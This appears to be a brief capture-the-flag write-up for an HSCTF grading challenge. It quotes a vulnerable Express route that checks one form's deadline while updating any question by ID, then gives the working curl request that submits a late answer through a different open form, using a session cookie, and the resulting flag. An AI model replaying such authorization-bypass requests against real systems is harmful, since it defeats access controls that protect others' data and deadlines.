@@ -1,0 +1,30 @@
+.post(authMW, (req, res) => {
+    const now = Date.now()
+    const form = req.user.forms.id(req.params.formID)
+    if(now > form.deadline) {
+        res.json({response: "too late"})
+    } else {
+        if(req.body.ID) {
+            const question = req.user.questions.id(req.body.ID)
+            console.log(question);
+            question.submission = req.body.value
+            req.user.save()
+        } else {
+            form.submitted = true
+            req.user.save()
+        }
+
+        res.json({response: "heh"})
+    }
+
+})
+
+Use new form for old question
+
+
+curl -L -X POST https://grading.hsc.tf/60cc63d78c156ef7f75287f5 -b "connect.sid=s%3AnGNUJRnTH9iLJVjvmymeOZXuYcefTfif.FGA7oMcEzeHC4%2F0RsfLcK%2BF8duJkp61i6mfY5ji%2F6ks" --data "ID=60cc63d78c156e62cf5287f2&value=Africa is not a country" -H "Content-type: application/x-www-form-urlencoded"
+
+Back to `simple quiz` (https://grading.hsc.tf/60cc63d78c156e00ce5287f4)
+```
+flag{th3_an5w3r_w4s_HSCTF_0bvi0us1y}
+```
